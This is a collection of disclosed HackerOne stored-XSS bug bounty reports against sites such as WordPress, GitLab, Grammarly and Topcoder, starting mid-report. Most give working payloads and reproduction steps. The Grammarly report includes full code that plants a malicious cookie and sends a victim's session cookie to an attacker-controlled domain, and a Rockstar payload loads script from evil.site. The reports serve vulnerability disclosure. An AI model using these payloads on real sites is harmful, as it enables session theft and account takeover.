5. Click `Ok` button and wait.
6. Click Preview button and you will see xss alert.

PoC:
1. Go to https://████████/_login/default.aspx?ReturnUrl=%2f_layouts%2f15%2fauthenticate.aspx%3fsource%3d%2fConference&source=/Conference and login with this username and password:
`username: ███████`
`password: ███████`

2. Go to https://██████/Profiles/My/alobaloss/Blog/Lists/Photos/evilsvgfile.svg
So, you can see xss alert.

## Impact

Classic Stored Xss

---

### [Stored XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action](https://hackerone.com/reports/866815)

- **Report ID:** `866815`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Lab45
- **Reporter:** @meryem0x
- **Bounty:** - usd
- **Disclosed:** 2020-05-12T13:47:23.015Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi :) Adding javascript url causes to stored XSS when creating bookmark.

## Steps To Reproduce:

Go to https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action . Write `javascript:alert(document.domain)` on url input and fill other areas. After create, go `https://apps.topcoder.com/wiki/display/tcwiki/<TITLE>` and when you click the title on this page, XSS will execute.

PoC:
https://apps.topcoder.com/wiki/display/tcwiki/powerpuff_hackerone_test
{F816754}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

---

### [Stored XSS on https://apps.topcoder.com/wiki/pages/editpage.action](https://hackerone.com/reports/867133)

- **Report ID:** `867133`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Lab45
- **Reporter:** @meryem0x
- **Bounty:** - usd
- **Disclosed:** 2020-05-12T13:37:08.626Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi :) There is a stored XSS on wiki pages and it executes when editing page.

## Steps To Reproduce:
After I submitted #867125, i realized that the vote macro causes stored XSS on wiki edit page. 
A user can edit wiki pages on https://apps.topcoder.com/wiki/pages/editpage.action?pageId=. Users can insert macros to pages. Vote macro is vulnerable to XSS. 

Go to a wiki page, edit it and type

```
{vote:What is your favorite vulnerability?}
RCE
SSRF
XSS"><img src=X onerror=alert(document.domain)>
{vote}
```
and save it. When an other user edit this page, XSS will execute.

PoC:
https://apps.topcoder.com/wiki/pages/editpage.action?pageId=165871793
{F817588}

Note: This only works to signed-in users. Because unauthorized users cannot edit pages. I think there is a mistake on https://apps.topcoder.com/wiki/login.action now. If you encounter an error, you can login on main site (https://accounts.topcoder.com/member) then try.

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

---

### [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679)

- **Report ID:** `765679`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Palo Alto Software
- **Reporter:** @homai
- **Bounty:** - usd
- **Disclosed:** 2020-04-18T12:39:36.397Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There isn't a check mechanism on file format in Inbox which an attacker can send an SVG file as other formats such as png, gif or bmp by rename and change file format leads XSS attack and steal victim cookies.

## Steps To Reproduce:
You should create 2 accounts :
First account for the attacker and second one for the victim.

The attacker in my scenario: seq@seq.teamoutpost.com
The victim in my scenario: seq1@seq1.teamoutpost.com

  1. Please log in to the first account via this [link] (https://app.outpost.co/sign-in) 
  1. From Inbox create New Conversation and attached following files (Attached on this report) and send 
       These files are an SVG file which changes file format to png, bmp, gif
       If you want to see payload open file by notepad. you'll see payload like the following code :

```
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
```
  1. Whenever victim clicks on each file, open a new tab and XSS attack occurs and steal the victim's cookie.

## Supporting Material/References:

Browsers :
Mozilla Firefox 71.0
Google Chrome 79.0.3945.88

  * [attachment / reference]

For clarification, you can watch POC file (Attached on this report)

If you have any questions, let me know.

Best regards.

## Impact

Attacker can send malicious files to victims and steals victim's cookie leads to account takeover.

**Summary (researcher):**

Attackers can trigger XSS by SVG files. Developers should attention to block SVG files or sanitize files before upload.
This report has found by the following link :
[File Upload XSS](https://brutelogic.com.br/blog/file-upload-xss/)

Thanks to Master of XSS : [Rodolfo Assis](https://twitter.com/rodoassis)

---

### [Stored XSS in wordpress.com](https://hackerone.com/reports/733248)

- **Report ID:** `733248`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @adhamsadaqah
- **Bounty:** - usd
- **Disclosed:** 2020-02-17T11:34:36.958Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Stored XSS as a comment or as a post (body or title)  at 
`https://wordpress.com/read/feeds/{blog_id}/posts/{post_id}`
`https://yoursubdomain.wordpress.com`
using the payload:
 ```
<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
```
## Steps To Reproduce:
- As a comment 
  1. Log in to wordpress.com
  2. Choose a post from the feeds
  3. Add a comment with the payload:
         `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;`
 4. By clicking on `Click Here`, an alert will fire with cookies of the domain `wordpress.com`
- As a post
  1. Log in to wordpress.com
  2. Create a new post or site.
  3. Add the payload `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;`  to the body or the title of the blog post
  4. preview or publish your new blog post
  5. By clicking on `Click Here`, an alert will fire with cookies of the domain `yoursubdomain.wordpress.com` or `wordpress.com` if the post is previewed from the WordPress feed.  
 6. If you add comments to your blog post and using the payload mentioned above as a comment an Stored XSS alert will fire when you click on the link.

## Impact

- Perform arbitrary requests on the behalf of other users with security context of  wordpress.com or blogsubdomain.wordpress.com
- Read any data the attacked user has access to.

---

### [[file-browser] Inadequate Output Encoding and Escaping ](https://hackerone.com/reports/507303)

- **Report ID:** `507303`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @johnssimon007
- **Bounty:** - usd
- **Disclosed:** 2020-01-29T16:24:06.082Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report stored xss in file-browser module
It allows an attacker to embed malicious js code as filenames,which get executed once browsed to the file over the web browser

# Module

**module name:** file-browser
**version:** 0.0.5
**npm page:** https://www.npmjs.com/package/file-browser

## Module Description
file-browser is a utility to browse files on your file system using your browser. Its equivalent of creating a file share that can be accessed over http. Using this you can share files between different machines, and across different operating systems.


## Vulnerability Description

due to improper output encoding and escaping ,it was possible for an attacker to embed malicious js code as filenames,which get executed once browsed to the file over the web browser
## Steps To Reproduce:
1.  npm -g install file-browser

2.now running below command will start a file server on the specified port:
  file-browser

3.now create a file with xss payload as filename in current dir

touch '"><img src=x onerror=alert("xss")>.jpg'

4.now goto url at which the file server is running

http://127.0.0.1:8088/lib/template.html

now xss will popup

## Supporting Material/References:

- [OPERATING SYSTEM VERSION] Kali linux
- [NODEJS VERSION] 11.8.0
- [NPM VERSION] 6.5.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

this could have enabled an attacker to execute malicous js code which might lead to session stealing,hooking up browser with frameworks like beef and so on

---

### [Хранимый XSS в Business-аккаунте, на странице компании](https://hackerone.com/reports/771882)

- **Report ID:** `771882`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** DRIVE.NET, Inc.
- **Reporter:** @konqi
- **Bounty:** - usd
- **Disclosed:** 2020-01-17T14:42:43.657Z
- **CVE(s):** -

**Vulnerability Information:**

Приложение уязвимо к атакам Типа "Межсайтовое выполнение сценариев". Тип XSS - Хранимый (Persistent). Для воспроизведения атаки нужно зарегистрироваться на сайте drive2.ru и подключить бизнес-аккаунт. После чего переходим в панель управления компанией и заполняем все необходимые поля для успешной регистрации на сайте. Нам интересует поле "Название компании" которое и выводится на сайте без необходимой фильтрации. Заполняем форму компании, а в поле "Название компании" пишем наш payload, например:
```html
<svg/onload=confirm(document.domain)>
```
После успешного сохранения данных переходим на страницу компании и наш JavaScript автоматически выполняется.
{F680923}
{F680924}

## Impact

Уязвимость недостаточной фильтрация данных, которые попадают в контекст HTML можно использовать по разному, от банального фишинга  до проведения атаки XSS. В нашем случай XSS хранимый, что делает атаку более опасным, так как нет необходимости отправлять жертве ссылку которая содержит вредоносный код. При браузинге страницы компании XSS payload выполнится автоматически. С помощью XSS атакующий может красть пользовательские куки, которые не защищены флагом "httpOnly". Помимо этого можно выполнить редирект на вредоносные сайты и так далее. Для защиты от подобных уязвимостей рекомендую тщательно проверять данные которые попадают в контекст HTML. Спецсимволы которые могут быть использованы для проведения атаки XSS/Content Injection должны быть сконвертированы в сущности HTML. Рекомендуется использовать флаги "secure" и "httpOnly" для сессионных/авторизационных кук.

---

### [Potential unprivileged Stored XSS through wp_targeted_link_rel](https://hackerone.com/reports/509930)

- **Report ID:** `509930`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @simonscannell
- **Bounty:** - usd
- **Disclosed:** 2020-01-08T16:12:24.864Z
- **CVE(s):** CVE-2019-16773

**Vulnerability Information:**

The user description is vulnerable to a Stored XSS via an attribute injection. At fault is the `wp_targeted_link_rel()` filter that parses attributes regardless of their position.

```
function wp_targeted_link_rel( $text ) {
	// Don't run (more expensive) regex if no links with targets.
	if ( stripos( $text, 'target' ) !== false && stripos( $text, '<a ' ) !== false ) {
		$text = preg_replace_callback( '|<a\s([^>]*target\s*=[^>]*)>|i', 'wp_targeted_link_rel_callback', $text );
	}
```

It essentially just parses the attribute string of all `<a>` tags and passes them to the preg replace callback.

```
function wp_targeted_link_rel_callback( $matches ) {
	$link_html = $matches[1];
	$rel_match = array();
...
// Value with delimiters, spaces around are optional.
	$attr_regex = '|rel\s*=\s*?(\\\\{0,1}["\'])(.*?)\\1|i';
	preg_match( $attr_regex, $link_html, $rel_match );

	if ( empty( $rel_match[0] ) ) {
		// No delimiters, try with a single value and spaces, because `rel =  va"lue` is totally fine...
		$attr_regex = '|rel\s*=(\s*)([^\s]*)|i';
		preg_match( $attr_regex, $link_html, $rel_match );
	}
```

As can be seen it then uses a regex to parse the `rel` attribute, its value and its delimeter from the string.

If the rel attribute is found, the following happens:

```

	if ( ! empty( $rel_match[0] ) ) {
		$parts     = preg_split( '|\s+|', strtolower( $rel_match[2] ) );
		$parts     = array_map( 'esc_attr', $parts );
		$needed    = explode( ' ', $rel );
		$parts     = array_unique( array_merge( $parts, $needed ) );
		$delimiter = trim( $rel_match[1] ) ? $rel_match[1] : '"';
		$rel       = 'rel=' . $delimiter . trim( implode( ' ', $parts ) ) . $delimiter;
		$link_html = str_replace( $rel_match[0], $rel, $link_html );
```

As you can see the value of the `rel` attribute is splitted by whitespaces and each part is then escaped. The targeted `rel` value is then added to the alread existing ones and put back together.

Most importantly, are the following line:

```
		$delimiter = trim( $rel_match[1] ) ? $rel_match[1] : '"';
		$rel       = 'rel=' . $delimiter . trim( implode( ' ', $parts ) ) . $delimiter;
		$link_html = str_replace( $rel_match[0], $rel, $link_html );
```
if the delimeter is empty (e.g. when `rel=abc` has no quotes), the delimer becomes  `"`. The original rel attribute is then replaced with the new one. 

This is a problem since the following payload:

`<a title="  target='xyz'  rel=abc ">PoC</a>`

would turn into

`<a title=" target='xyz' rel="abc" ">PoC</a>` Note that an additional `"` has been injected and the title attribute has been escaped.

This is because the regex to match the rel attribute ignores the position of the `rel` attribute within the attribute string. The above payload shows how the rel attribute is placed within a double quoted attribute. Since no delimeter is set, the delimer becomes a double quote and when the rel attribute is inserted back into the string, the double quote is injected.

I recommend using something like `parse_shortcode_atts()` as in `wp_rel_nofollow()` to prevent this from happening.

By abusing the attribute injection, it is easily possible to create a Stored XSS payload. 

Tge `wp_targeted_link_rel()` filter is not only called on the user description, however, this is where it becomes exploitable. This is because this vulnerable filter is added before the `kses` filters are added, which means that the injected attribute would be caught by `wp_post_kses()`. The user description is the only exception where the kses filters are called before `wp_targeted_link_rel()` is called.

`<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>`


## Proof of Concept

The following will demonstrate how a normal forum user can achieve stored XSS on their profile page in BuddyPress
████████

1. This works if the Bio of forum users is displayed in their profile page. Log in as an administrator and go to Appearence -> Customize and then BuddyPress Nouveu -> Member front page and make sure that displaying the user bio is enabled

2. Create a normal forum user account
3. Login and edit your profile. Paste 
`<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>` as your user description
4. visit your profil and hover over the link.

## Impact

The Impact of this can vary from site to site. I have shown how this can be exploited in BuddyPress as a mere, normal forum user. Since you can also inject a style attribute and make the link span over the entire page, one can turn this into a wormable Stored XSS in BuddyPress.

Basically every plugin or forum is affected that displays the user description.

---

### [[fileview] Inadequate Output Encoding and Escaping ](https://hackerone.com/reports/507159)

- **Report ID:** `507159`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @johnssimon007
- **Bounty:** - usd
- **Disclosed:** 2019-12-28T21:09:28.894Z
- **CVE(s):** CVE-2019-15602

**Vulnerability Information:**

I would like to report stored xss in fileview module
It allows an attacker to embed malicious js code in filename there was no sanitization performed. 

# Module

**module name:**fileview
**version:** 0.1.6
**npm page:** https://www.npmjs.com/package/fileview

## Module Description
File browsers on web. It's easy to browser your local file.


# Vulnerability

## Vulnerability Description

since there was no sanitizations performed on filenames ,an attacker can include filenames with malicious js code which gets executed when browsed to the file  over the web browser

## Steps To Reproduce:
1.install fileview:
npm install fileview -g

2:now create a file with xss payload as follows:
"><img src=x onerror=alert("xss")>.jpg

3.running below command on terminal  will start a file server at port 8080

fileview -p /root/ -P 8080

4.now goto http://127.0.0.1:8080/

you will see the xss got executed



## Patch

> If you're able to provide a patch with the fix please post it in this section

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION] KALI LINUX
- [NODEJS VERSION] 11.8.0
- [NPM VERSION]  6.5.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

this could have allowed an attacker to embed malicious js code in filename and executes it when  victim browse to file over the web browser

---

### [Stored XSS on Wordpress 5.3 via Title Post](https://hackerone.com/reports/754352)

- **Report ID:** `754352`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @muhammaddaffa
- **Bounty:** - usd
- **Disclosed:** 2019-12-10T09:58:14.881Z
- **CVE(s):** -

**Vulnerability Information:**

I have identified a WordPress security vulnerability , a Stored XSS vulnerability that affects latest version of WordPress (5.3)

POC:
1) Login to wordpress website
2) Make a post with title payload xss like example <script>alert(document.domain);</script>
3) Publish then open the post, XSS Will trigger

## Impact

Can stealing cookie user

---

### [Account takeover through the combination of cookie manipulation and XSS](https://hackerone.com/reports/534450)

- **Report ID:** `534450`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @k4r4koyun
- **Bounty:** - usd
- **Disclosed:** 2019-12-03T20:59:30.537Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called "/cookies" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass "CORS protection/HttpOnly cookie flag" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.

**Description:** An endpoint at gnar.grammarly.com called "/cookies" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.

This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.

Then we have found that Grammarly uses multiple cookies and one of them is called "gnar_containerId". We have discovered that this cookie gets reflected on the "www.grammarly.com" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code

Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.

To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.

For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.

**Solution:** This attack scenario was made possible because of the following:

  * gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
  * There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
  * Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.

## Browsers Verified In:

  * Google Chrome 73.0.3683.86 (Official Build) (64-bit)
  * Mozilla Firefox 60.6.1esr (64-bit)

## Steps To Reproduce:

  * Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)

  * Serve the HTML snipped below on the said page (called "Grammarly.html" for example):

```html
<html>

<head>
<title>Grammarly POC</title>
<meta charset="utf-8"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<script>

    var cookie_hax = {
        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
    };

    for (var name in cookie_hax) {
        $.ajax({
            type: "POST",
            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
            cache: false,
            xhrFields: {
                withCredentials: true
            },
            crossDomain: true,
            async: false,
        });
    }

    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");

</script>
</body>

</html>
```
  * Serve the javascript code below on the same webserver (called "poc.js" for example):

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
xhr.withCredentials = true;
xhr.onload = function () {
    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
    this.send();
};
xhr.send();
```
  * Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)

## Supporting Material/References:

  * Webserver access logs: 

```
178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] "GET /poc.js HTTP/1.1" 200 736 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] "GET /?cookie={██████████} HTTP/1.1" 200 3466 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
```

## Impact

* Account takeover via cookie stealing

---

### [stored xss in https://www.smule.com](https://hackerone.com/reports/733222)

- **Report ID:** `733222`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Smule
- **Reporter:** @hami
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T18:40:38.926Z
- **CVE(s):** -

**Vulnerability Information:**

hi team ,
I found a stored xss in www.smule.com

**Summary:** [add summary of the vulnerability]

The most damaging type of XSS is Stored XSS (Persistent XSS). An attacker uses Stored XSS to inject malicious content (referred to as the payload), most often JavaScript code, into the target application. If there is no input validation, this malicious code is permanently stored (persisted) by the target application, for example within a database. For example, an attacker may enter a malicious script into a user input field such as a blog comment field or in a forum post.

When a victim opens the affected web page in a browser, the XSS attack payload is served to the victim’s browser as part of the HTML code (just like a legitimate comment would). This means that victims will end up executing the malicious script once the page is viewed in their browser
##details :

parameter vulnerable :Blurb, Location and Name ,this all vulnerable to xss

payload:"></script><script>alert(document.cookie)</script>
payload 2:</script><script>akert(1)</script>

## Steps To Reproduce:
       
    1- login and go to settings
    2- add payload to field Blurb
    3- refresh page
    4- xss will pop up

## poc : in video below

## Impact

Stealing cookies.
can lead to user's Session Hijacking.
can also lead to disclosure of sensitive data.
and more

---

### [Stored Self XSS on https://app.crowdsignal.com (in Photo Insert App) + Stored XSS on https://*your-subdomain*.survey.fm](https://hackerone.com/reports/667188)

- **Report ID:** `667188`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @ali
- **Bounty:** - usd
- **Disclosed:** 2019-10-21T14:58:34.284Z
- **CVE(s):** -

**Vulnerability Information:**

Steps:
1. Go to https://app.crowdsignal.com/dashboard and click Create a New > Quiz
2. Add Multiple Choice to your page and click image button, upload a photo and click upload.
3. Start the burp suite and click Save button. Look at the request (poc1.png) and you will see media_code= parameter. It will be your photo's id and change it as payload and forward the request. Payload: "><svg/onload=alert(document.domain)> 
4. Now you will see xss (poc2.png). Copy the quiz link and open it the new tab. You will see second xss (poc3.png). And this one is stored xss.

## Impact

XSS

**Summary (researcher):**

I love bug bounty.
I love xss.
https://twitter.com/alicanact60

---

### [The return of the ＜](https://hackerone.com/reports/639684)

- **Report ID:** `639684`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rockstar Games
- **Reporter:** @alexbirsan
- **Bounty:** 1000 usd
- **Disclosed:** 2019-09-24T21:40:58.729Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to '<', as well as discovering improper escaping of the aforementioned '<' character, the researcher was able to craft a payload to perform XSS attacks. 

An example payload:

=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕

---

### [Stored XSS in Wiki pages](https://hackerone.com/reports/526325)

- **Report ID:** `526325`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @ryhmnlfj
- **Bounty:** - usd
- **Disclosed:** 2019-09-02T11:30:07.764Z
- **CVE(s):** CVE-2019-5467

**Vulnerability Information:**

### Summary

I found Stored XSS using Wiki-specific Hierarchical link Markdown in Wiki pages.

### Steps to reproduce

1. Sign in to GitLab.
2. Open a Project page that you have permission to edit Wiki pages.
3. Open Wiki page.
4. Click "New page" button.
5. Fill out "Page slug" form with `javascript:`.
6. Click "Create page" button.
7. Fill out the each form as follows:    
Title: `javascript:`    
Format: Markdown    
Content: `[XSS](.alert(1);)`    
(Please see "CreatePage.png")    
{F462086}    
8. Click "Create page" button.
9. Click "XSS" link in created page.

### What is the current *bug* behavior?

The alert dialog appears after clicking "XSS" link in created page.
Please see "Result_Firefox.png".
{F462087}

#### Description In Detail:

GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.
Furthermore, Wiki-specific Markdown string `.` is converted to `javascript:` in this case.

### What is the expected *correct* behavior?

The dangerous href attribute `javascript:alert(1);` should be filtered.
A safe HTTP/HTTPS link should be rendered instead.

### Additional Informations:

1. In the above case, another Wiki-specific Markdown string `..` is also converted to `javascript:`.

2. Using Title string such as `javascript:STRING_EXPECTED_REMOVING` also reproduces this vulnerability.
For example, if a wiki page is created with a disguised Title string `JavaScript::SubClassName.function_name`, GitLab application converts Wiki-specific Markdown string `.` to `JavaScript:` in such page.
It seems that GitLab application recognizes scheme-like string `JavaScript:` and removes the rest of Title string `:SubClassName.function_name`.

3. An attacker can use various schemes by replacing Title string `javascript:` to other scheme. (e.g. `data:`, `vbscript:`, and so on.)

### Output of checks

This bug happens on the official Docker installation of GitLab Enterprise Edition 11.9.4-ee.

#### Results of GitLab environment info

Output of `sudo gitlab-rake gitlab:env:info`:

```
System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.5.3p105
Gem Version:	2.7.6
Bundler Version:1.16.6
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.18.1
Sidekiq Version:5.2.5
Go Version:	unknown

GitLab information
Version:	11.9.4-ee
Revision:	55be7f0
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	postgresql
DB Version:	9.6.11
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	8.7.1
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

If wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to "Everyone With Access") in "Public" project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.

---

### [[okmedia.insideok.ru] Web Cache Poisoing & XSS](https://hackerone.com/reports/550266)

- **Report ID:** `550266`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** ok.ru
- **Reporter:** @iframe
- **Bounty:** - usd
- **Disclosed:** 2019-07-23T14:56:25.104Z
- **CVE(s):** -

**Summary (team):**

XSS and Web Cache Poisoning at *.insideok.ru via X-Forwarded-Host header

**Summary (researcher):**

Web Cache Poisoing & XSS okmedia.insideok.ru

---

### [Persistent XSS in Note objects](https://hackerone.com/reports/508184)

- **Report ID:** `508184`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 4500 usd
- **Disclosed:** 2019-07-19T00:03:17.197Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Some cache invalidation and project import logic issues enable an attacker to import a project with XSS payloads in places like MR discussions and similar places where a Note object exists.

**Description:**
There are basically 3 issues causing the XSS here:
All attributes of Note objects are controllable in `project.json`, for example `note_html` and `cached_markdown_version`.

Now I can control the value of `note_html` to contain my XSS payload, but the problem is that the value of this field is a `CacheMarkdownField`, it's regenerated from the value of `note` during new object creation (when `note_object.note_html_invalidated?` returns true). The next question is how to trick GitLab that the field does not need to be regenerated.

in `app/models/concerns/cache_markdown_field.rb`
```
      define_method(invalidation_method) do
        changed_fields = changed_attributes.keys
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")

        !invalidations.empty? || !cached_html_up_to_date?(markdown_field)
      end
```

There are 2 checks here (also the last 2 issues):
the first one is:
```
        INVALIDATED_BY = %w[author project].freeze
...
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")
```

```
note_object.changed_attributes.keys
=> ["note", "noteable_type", "author_id", "created_at", "updated_at", "project_id", "line_code", "position", "original_position", "note_html", "cached_markdown_version", "change_position", "attachment"]
```

This check is, unfortunately, voided because
+ Neither `author` nor `project` is in the changed_attributes list, but `author_id` and `project_id`
+ `note` is deleted from `invalidations` because `note_html` is also changed
So invalidations is empty.

and the other one is:
```
!cached_html_up_to_date?(markdown_field)
```
It basically checks whether attribute `cached_markdown_version` equals to `latest_cached_markdown_version`
This is really interesting, because I found that `latest_cached_markdown_version` is always 917504 in my GitLab instance (also gitlab.com). Looks like `local_version` is always 0 for at least Notes in MR.

```
  def latest_cached_markdown_version
    @latest_cached_markdown_version ||= (CacheMarkdownField::CACHE_COMMONMARK_VERSION << 16) | local_version
  end

  def local_version
    return local_markdown_version if has_attribute?(:local_markdown_version)

    settings = Gitlab::CurrentSettings.current_application_settings

    if settings.respond_to?(:local_markdown_version)
      settings.local_markdown_version
    else
      0
    end
  end
```

Finally, I could set `note_html` to the XSS payload, and `cached_markdown_version` to the magic number to avoid my payload being overwritten by GitLab. :P


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Create an export of a project with at least 1 discussion in at least 1 merge request.
  1. Modify the project.json, add field `note_html` and `cached_markdown_version`

```
      "notes": [
        {
          "id": 1,
          "note": "interesting note here",
          "note_html": "<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
          "cached_markdown_version": 917504,
```

  1. Import the modified project
  1. View the only discussion of the imported project.

## Supporting Material/References:

Check `https://gitlab.com/Nyangawa/xss/merge_requests/1`, you should be able to see a pop-up.

## Impact

This is a typical persistent XSS issue and the link I mentioned above is accessible publicly, so all GitLab users are vulnerable theoretically.

---

### [Stored XSS Vulnerability](https://hackerone.com/reports/643908)

